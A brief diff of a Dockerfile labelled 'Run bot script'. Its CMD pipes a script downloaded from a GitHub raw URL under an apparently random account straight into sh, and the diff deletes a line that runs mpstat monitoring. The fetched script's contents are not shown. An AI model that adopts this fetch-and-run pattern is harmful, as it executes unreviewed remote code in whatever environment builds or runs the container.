@@ -38,5 +38,3 @@ RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
-
-CMD sudo apt-get install sysstat && mpstat && mpstat 5 99999
